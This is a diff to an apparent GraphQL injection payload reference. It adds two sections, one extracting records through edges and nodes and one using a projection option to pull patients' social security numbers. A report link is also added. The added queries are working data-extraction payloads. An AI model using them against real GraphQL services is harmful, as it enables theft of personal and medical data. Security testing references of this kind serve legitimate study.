@@ -10,6 +10,8 @@
   * [Identify an injection point](#identify-an-injection-point)
   * [Enumerate Database Schema via Instropection](#enumerate-database-schema-via-introspection)
   * [Extract data](#extract-data)
+  * [Extract data using edges/nodes](#extract-data-using-edges-nodes)
+  * [Extract data using projections](#extract-data-using-projections)
   * [Enumerate the types' definition](#enumerate-the-type-definition)
   * [Use mutations](#use-mutations)
   * [NOSQL injection](#nosql-injection)
@@ -159,6 +161,32 @@ example.com/graphql?query={TYPE_1{FIELD_1,FIELD_2}}
 ![HTB Help - GraphQL injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/Images/htb-help.png?raw=true)
 
 
+
+### Extract data using edges/nodes
+
+```json
+{
+  "query": "query {
+    teams{
+      total_count,edges{
+        node{
+          id,_id,about,handle,state
+        }
+      }
+    }
+  }"
+} 
+```
+
+### Extract data using projections
+
+:warning: Don’t forget to escape the " inside the **options**.
+
+```json
+{doctors(options: "{\"patients.ssn\" :1}"){firstName lastName id patients{ssn}}}
+```
+
+
 ### Enumerate the types' definition 
 
 Enumerate the definition of interesting types using the following GraphQL query, replacing "User" with the chosen type
@@ -215,3 +243,4 @@ curl -X POST http://localhost:8080/graphql\?embedded_submission_form_uuid\=1%27%
 * [How to set up a GraphQL Server using Node.js, Express & MongoDB - 5 NOVEMBER 2018 - Leonardo Maldonado](https://www.freecodecamp.org/news/how-to-set-up-a-graphql-server-using-node-js-express-mongodb-52421b73f474/)
 * [GraphQL cheatsheet - DEVHINTS.IO](https://devhints.io/graphql)
 * [HIP19 Writeup - Meet Your Doctor 1,2,3 - June 22, 2019 - Swissky](https://swisskyrepo.github.io/HIP19-MeetYourDoctor/)
+* [Introspection query leaks sensitive graphql system information - @Zuriel](https://hackerone.com/reports/291531)
